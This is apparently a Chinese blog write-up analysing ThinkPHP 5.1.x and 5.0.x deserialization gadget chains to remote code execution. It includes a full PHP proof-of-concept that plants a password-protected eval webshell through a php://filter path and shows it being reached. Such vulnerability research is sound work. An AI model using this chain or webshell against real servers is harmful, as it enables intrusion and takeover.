class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public function input($data = [], $name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line">   &#123;</span><br><span class="line">       if (false === $name) &#123;</span><br><span class="line">           // 获取原始数据</span><br><span class="line">           return $data;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $name = (string) $name;</span><br><span class="line">       if (&#x27;&#x27; != $name) &#123;</span><br><span class="line">           // 解析name</span><br><span class="line">           if (strpos($name, &#x27;/&#x27;)) &#123;</span><br><span class="line">               list($name, $type) = explode(&#x27;/&#x27;, $name);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $data = $this-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">           if (is_null($data)) &#123;</span><br><span class="line">               return $default;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (is_object($data)) &#123;</span><br><span class="line">               return $data;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 解析过滤器</span><br><span class="line">       $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">       if (is_array($data)) &#123;</span><br><span class="line">           array_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);</span><br><span class="line">           if (version_compare(PHP_VERSION, &#x27;7.1.0&#x27;, &#x27;&lt;&#x27;)) &#123;</span><br><span class="line">               // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">               $this-&gt;arrayReset($data);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (isset($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">           // 强制类型转换</span><br><span class="line">           $this-&gt;typeCast($data, $type);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里参数仍旧不可控 不能直接使用</p>
+<p>那么继续看看谁调用了input 套娃就完事了</p>
+<p>那么这里是找到了param函数 不过参数仍旧不可控</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779998764-57f74acd-6dab-437f-a507-7a4ffcb6e633.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">            $method = $this-&gt;method(true);</span><br><span class="line"></span><br><span class="line">            // 自动获取请求变量</span><br><span class="line">            switch ($method) &#123;</span><br><span class="line">                case &#x27;POST&#x27;:</span><br><span class="line">                    $vars = $this-&gt;post(false);</span><br><span class="line">                    break;</span><br><span class="line">                case &#x27;PUT&#x27;:</span><br><span class="line">                case &#x27;DELETE&#x27;:</span><br><span class="line">                case &#x27;PATCH&#x27;:</span><br><span class="line">                    $vars = $this-&gt;put(false);</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    $vars = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 当前请求参数和URL地址中的参数合并</span><br><span class="line">            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line"></span><br><span class="line">            $this-&gt;mergeParam = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (true === $name) &#123;</span><br><span class="line">            // 获取包含文件上传信息的数组</span><br><span class="line">            $file = $this-&gt;file();</span><br><span class="line">            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line"></span><br><span class="line">            return $this-&gt;input($data, &#x27;&#x27;, $default, $filter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续寻找谁调用了param</p>
+<p>找到了 isAjax函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701780098519-a4d71b56-0839-4ef4-a226-8d9dcb651cba.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function isPjax($pjax = false)</span><br><span class="line">   &#123;</span><br><span class="line">       $result = !is_null($this-&gt;server(&#x27;HTTP_X_PJAX&#x27;)) ? true : false;</span><br><span class="line"></span><br><span class="line">       if (true === $pjax) &#123;</span><br><span class="line">           return $result;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $result           = $this-&gt;param($this-&gt;config[&#x27;var_pjax&#x27;]) ? true : $result;</span><br><span class="line">       $this-&gt;mergeParam = false;</span><br><span class="line">       return $result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而isAjax函数中 我们可控<code>$this-&gt;config[&#39;var_pjax&#39;]</code></p>
+<p>意味着param函数中<code>$name</code>可控</p>
+<p>意味着input函数中的<code>$name</code>可控</p>
+<p>在这里 以上我们说什么可控 什么不可控应该怎么判断呢 </p>
+<p>可以直接看类属性 类中明确定义了某个属性 那么这个属性我们就可以重写来控制</p>
+<p>而param函数可以获得<code>$_GET</code>数组 并且赋值给<code>$this-&gt;param</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782687578-16bc813b-9534-49c7-b37d-444a01d9a9b7.png" alt="img"></p>
+<p>跟进input</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781256320-141b25c8-120a-469c-90e9-86989d2047f6.png" alt="img"></p>
+<p>跟进getData</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected function getData(array $data, $name)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (explode(&#x27;.&#x27;, $name) as $val) &#123;</span><br><span class="line">            if (isset($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">$data=$data[$val]=$data[$name]</span><br></pre></td></tr></table></figure>
+
+<p>从GET数组中获取键名为Z1d10t的键值</p>
+<p>并且返回值就是我们的命令 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781443982-69813e68-019a-4b4b-bdea-6c6cd5eea7df.png" alt="img"></p>
+<p>接着进入getFilter函数获取filter属性</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781754618-b96d3cc0-7e9d-486f-a068-2c522e2813db.png" alt="img"></p>
+<p>在param函数中filter首先为空 然后在这里用<code>$this-&gt;filter</code>赋值 因此我们可以再poc中重新赋值为system</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781901324-7242fa00-4545-438d-b596-4fafb50146c4.png" alt="img"></p>
+<p>然后在$filter数组追加一个default 值为null 没大用 然后返回</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781993001-c21d178c-8095-49ed-a55a-173e719c21a3.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782003574-6cab6507-0e00-4ccd-8d28-7990359fb177.png" alt="img"></p>
+<p>最后进入filterValue函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782079134-841663cb-5743-4e13-82ea-e6a79e5ab3c4.png" alt="img"></p>
+<p>用array_pop弹出数组末尾的元素 因此只剩下了system</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782149417-fcbf6955-1c8c-488f-ab51-5f4a9dcab3b0.png" alt="img"></p>
+<p>然后再调用call_user_func方法 完成RCE</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782415565-2b48611f-8f94-40e3-81dc-ec156a1dcb46.png" alt="img"></p>
+<p>ok 让我们再来梳理一下思路 </p>
+<p>这里我们可以从两个方向正向与反向去分析比较清晰 </p>
+<p>正向：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; __destruct()</span><br><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; removeFiles()</span><br><span class="line">Windows.php:file_exists() 由于传入了new Pivot() 将对象当作了字符串处理 触发__toString</span><br><span class="line">由于Pivot类没有__toString 但是他继承了Model类 但是该类也不存在 然而它复用了Conversion类 可以用它的toString</span><br><span class="line">因此到了Conversion类</span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; __toString()</span><br><span class="line">__toString中又调用了toJon</span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; toJson() </span><br><span class="line">tojson()中又调用了toarray()</span><br><span class="line">toarray中存在调用visible()这个函数 此时思路为如果调用某个对象不存在的函数 那么会触发__call()</span><br><span class="line">并且Conversion类中$this-&gt;data类属性我们可控 getAttr()会获取键为Z1d10t的值 我们给他赋值一个对象Request</span><br><span class="line">因此到了Request类</span><br><span class="line">thinkphp\library\think\Request.php   - &gt; __call()</span><br><span class="line">该call函数中有call_user_func_array是可以执行命令但是 由于arary_unshift函数我们的参数第一个为一个对象因此没法愉快的执行函数</span><br><span class="line">此时正向就先断开了</span><br></pre></td></tr></table></figure>
+
+<p>反向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">前面由于参数不理想 我们没法愉快的执行函数 因此我们只好寻找其他方法</span><br><span class="line">那么存在filterValue这个过滤器函数 该函数直接存在call_user_func($filter,$value)</span><br><span class="line">在这里我们$filter是直接可控的 但是呢 $value是不可直接控制的 因此通过链式调用去看看哪个函数可以控制该$value</span><br><span class="line">最后找到input函数中调用了filterValue()</span><br><span class="line">thinkphp\library\think\Request.php - &gt; input()  $data由param()的$param控制 $name由param()的name控制</span><br><span class="line">thinkphp\library\think\Request.php - &gt; param()  $param通过get方式传参可控 $name可控由isAjax()可控</span><br><span class="line">thinkphp\library\think\Request.php - &gt; isAjax() 它传给param()的$this-&gt;config[&#x27;var_ajax&#x27;]是可控的 使得param() $name可控</span><br><span class="line">那么依次是找到了isAjax()-&gt;param()-&gt;input()-&gt;filterValue() （以上过程倒着看）</span><br><span class="line">依次执行函数需要的$value可控了 只需要用正向最后拿到的call_user_func_array()将isAjax()串起来 </span><br><span class="line">那么整条链子就通了</span><br><span class="line">thinkphp\library\think\Request.php - &gt; filterValue()</span><br></pre></td></tr></table></figure>
+
+<p>偷包浆的图 这个图思路太清晰了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png" alt="img"></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>直接把__call()方法砍了 后面的链子也就断掉了</p>
+<h1 id="5-2-x版本分析"><a href="#5-2-x版本分析" class="headerlink" title="5.2.x版本分析"></a>5.2.x版本分析</h1><p>这里官方已经把Thinkphp5.2.x升级为Thinkphp6.0因此没法下载5.2.x的源码包 </p>
+<p>寄 网上找不到相关源码包</p>
+<p>之后在6.x分析再回顾吧</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701853032417-15c295a4-6a2d-4321-9e45-802d2c775af2.png" alt="img"></p>
+<p>可以看这位师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6619#toc-1">thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区</a></p>
+<h1 id="5-0-x版本分析"><a href="#5-0-x版本分析" class="headerlink" title="5.0.x版本分析"></a>5.0.x版本分析</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>php5.0.24+Xdebug+thinkphp5.0.24+phpstudy+phpstorm</li>
+</ul>
+<p>和上面一样准备一个二次反序列化入口 替换<code>/application/index/controller/index.php</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701854704626-44a5de6b-09a6-4e37-ad44-b82ebe834d82.png" alt="img"></p>
+<p>poc：（影响版本5.0.24和5.0.18，5.0.9不可用）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//__destruct</span><br><span class="line">namespace think\process\pipes&#123;</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files=[];</span><br><span class="line"></span><br><span class="line">        public function __construct($pivot)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files[]=$pivot; //传入Pivot类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//__toString Model子类</span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    class Pivot&#123;</span><br><span class="line">        protected $parent;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error;</span><br><span class="line"></span><br><span class="line">        public function __construct($output,$hasone)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent=$output; //$this-&gt;parent等于Output类</span><br><span class="line">            $this-&gt;append=[&#x27;a&#x27;=&gt;&#x27;getError&#x27;];</span><br><span class="line">            $this-&gt;error=$hasone;   //$modelRelation=$this-&gt;error</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//getModel</span><br><span class="line">namespace think\db&#123;</span><br><span class="line">    class Query</span><br><span class="line">    &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        public function __construct($output)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model=$output; //get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output</span><br><span class="line">    &#123;</span><br><span class="line">        private $handle = null;</span><br><span class="line">        protected $styles;</span><br><span class="line">        public function __construct($memcached)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handle=$memcached;</span><br><span class="line">            $this-&gt;styles=[&#x27;getAttr&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Relation</span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne&#123;</span><br><span class="line">        protected $query;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;query=$query; //调用Query类的getModel</span><br><span class="line"></span><br><span class="line">            $this-&gt;selfRelation=false; //满足条件!$modelRelation-&gt;isSelfRelation()</span><br><span class="line">            $this-&gt;bindAttr=[&#x27;a&#x27;=&gt;&#x27;admin&#x27;];  //控制__call的参数$attr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver&#123;</span><br><span class="line">    class Memcached&#123;</span><br><span class="line">        protected $handler = null;</span><br><span class="line"></span><br><span class="line">        public function __construct($file)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler=$file; //$this-&gt;handler等于File类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver&#123;</span><br><span class="line">    class File&#123;</span><br><span class="line">        protected $options = [</span><br><span class="line">            &#x27;path&#x27;=&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;,</span><br><span class="line">            &#x27;cache_subdir&#x27;=&gt;false,</span><br><span class="line">            &#x27;prefix&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27;=&gt;false</span><br><span class="line">        ];</span><br><span class="line">        protected $tag=true;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $file=new think\cache\driver\File();</span><br><span class="line">    $memcached=new think\session\driver\Memcached($file);</span><br><span class="line">    $output=new think\console\Output($memcached);</span><br><span class="line">    $query=new think\db\Query($output);</span><br><span class="line">    $hasone=new think\model\relation\HasOne($query);</span><br><span class="line">    $pivot=new think\model\Pivot($output,$hasone);</span><br><span class="line">    $windows=new think\process\pipes\Windows($pivot);</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize($windows));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将生成的payload 在首先给input传参 （原谅这里为什么是thinkphp5.1 只要\thinkphp\base.php显示版本是正确的即可）</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855243164-639a1a3d-c7c6-4530-9997-781cc8000fa9.png" alt="img"></p>
+<p>然后访问<code>/public/a.php3b58a9545013e88c7186db11bb158c44.php</code></p>
+<p>密码为ccc 可见是可以打通的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855194658-fff84791-d39a-4d12-a5a0-314b74e7a472.png" alt="img"></p>
+<p>可以看一下我们写马上去的文件内容 可见不是正常的一句话 里面其实还包括了filterchain的知识点</p>
+<p>一句话理解就是利用base64、iconv等编码组合构造出特定的php代码进而完成无需临时文件的RCE 并且可以绕过死亡函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855894718-11638ac7-dace-4401-a191-35e6dd8bd4e3.png" alt="img"></p>
+<h2 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h2><p>首先我们的入口点还是Windows.php的析构函数 前面一部分的链子和5.1.x的差不多</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375636049-c3987dc4-2055-40d9-afb2-e19ef408cc37.png" alt="img"></p>
+<p>继续跟进 到了removeFiles() 这里还是一样由于直接把对象当作字符串传入file_exists函数 因此导致会触发<code>__toString()</code> </p>
+<p>但是和5.1.x的链子不同的是5.0.x的model类有<code>__toSting()</code> 因此不需要use 5.1.x的被trait修饰的Converison类用它的<code>__toString()</code></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375828839-82070bc9-5c06-4c40-b71a-835552d0f7de.png" alt="img"></p>
+<p>继续跟进 到toJson()</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375862497-c655956d-eb3c-4409-99d4-7eb0b9ea9892.png" alt="img"></p>
+<p>然后进到了toArray()函数</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376002618-a6d2f155-ae7a-4b05-8ba7-71a97e257ebb.png" alt="img"></p>
+<p>这里有四个断点我们需要着重分析</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376154221-3e88dbd1-be05-4e8a-8552-5d5d9e3d7c5e.png" alt="img"></p>
+<p>首先这里<code>$relation</code>是通过<code>parseName</code>方法完成的 顺便提一嘴 这里调用方法方式是通过静态方法调用的</p>
+<p>那这里我们需要知道<code>$name </code>的值是通过遍历<code>$this-&gt;append</code>数组赋值的为getError</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376915350-5f097820-b5a3-413a-b85f-157888ed6d97.png" alt="img"></p>
+<p>那这里有个疑惑就是我们poc中是给Pivot类的<code>$this-&gt;append</code>赋值的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376975289-22b19a10-94c9-4d5a-b5b1-6fb5d6524397.png" alt="img"></p>
+<p>为什么这里Model直接用呢 因为Model是Pivot的父类 因此父类可以直接调用子类的protected修饰的属性</p>
+<p>ok 我们继续跟进分析一下</p>
+<p>这里<code>type=1</code>进入if语句 直接返回getError</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377084411-7ec81a05-3bb0-49b6-acb3-8fd7b9c99bd6.png" alt="img"></p>
+<p>此时$relation为getError 继续到 <code>method_exists</code>函数 </p>
+<p>Model这个类是有getError函数的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377185911-2e85ad88-f1ec-4ea5-8aa1-54a915edc50d.png" alt="img"></p>
+<p>因此会进入 这里的error可控 并且我们设置为了HasOne对象 </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377378463-a7d85d0c-8de6-43d0-b817-a926d5b334ee.png" alt="img"></p>
+<p>同样poc中也是可以体现出来的</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383452619-335e2d8b-8178-46ec-87e6-bf8d4f2f2b1d.png" alt="img"></p>
+<p>第一个断点至此先说到这里 我们继续跟进第二个断点</p>
+<p>是对<code>$value</code>进行赋值</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702383592936-3f2e8136-b869-4562-ac0c-0e816bcffd14.png" alt="img"></p>
+<p>这里有一个很长的if条件语句的判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</span><br></pre></td></tr></table></figure>
+
+<p>我们一部分一部分来看</p>
+<p>条件一：</p>
+<p>之前我们5.1版本的时候在<code>__toSring</code>这一部分的时候是触发了__call方法，那么我们在这的目标也是去寻找合适的call方法，那么最终是找到了<code>think\console\Output</code>我们应该让这个方法返回一个output对象 这样等我们出去之后 执行<code>$value-&gt;getAttr($attr)</code>就会触发<code>__call()</code>；额，因此这里value的值为<code>$this-parent</code>，所以我们需要赋值为一个output对象</p>
+<p>条件二：</p>
+<p>$modelRelation我们已经对它赋值了HasOne对象了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384075250-485d27df-567b-42e4-909f-c9373ac7cc21.png" alt="img"></p>
+<p>我们跟进<code>isSelfRelation()</code>方法 它是Relation类的一个方法</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384182743-0270df5d-fc44-408e-9f9a-6def2b02dbb4.png" alt="img"></p>
+<p>而OneToOne是它的子类 <img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384248249-c1f53c2f-f63c-4258-a3c5-9e277eace62c.png" alt="img"></p>
+<p>HasOne是OneToOne的一个子类<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384300728-5a488be0-ad20-48a0-a430-fc24575a168b.png" alt="img"></p>
+<p>因此我们控制<code>HasOne-&gt;selfRelation</code>为false即可</p>
+<p>条件三：<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code></p>
+<p>之前我们说到让<code>$this-&gt;parent</code>为一个Output对象即可 因此这里条件成立的就是让<code>$modelRelation-&gt;getModel()</code>返回一个output对象</p>
+<p>我们跟进这个函数观察一下</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384583595-25a71b36-479a-4fa7-9850-231cb4feb500.png" alt="img"></p>
+<p>那么思路就是看看哪个类使用了同名getModel函数 并且方法我们可控</p>
+<p>那么最后找到是Query类</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384728365-53145e1f-2749-4e58-b5f2-7ad47555d27e.png" alt="img"></p>
+<p>因此我们这里只需要<code>$this-&gt;query</code>为Query的一个对象即可 </p>
+<p>那么三个条件均满足 然后<code>$value = $this-&gt;parent</code>我们就出来了</p>
+<p>接着进入第三个断点</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702384867170-96542676-a086-45fc-a7c7-78f0cbc455e0.png" alt="img"></p>
+<p>这里<code>$modelRelation</code>是HasOne对象 调用它的getBindAttr方法 其实它没有 调用的是它的父类OneToOne的方法</p>
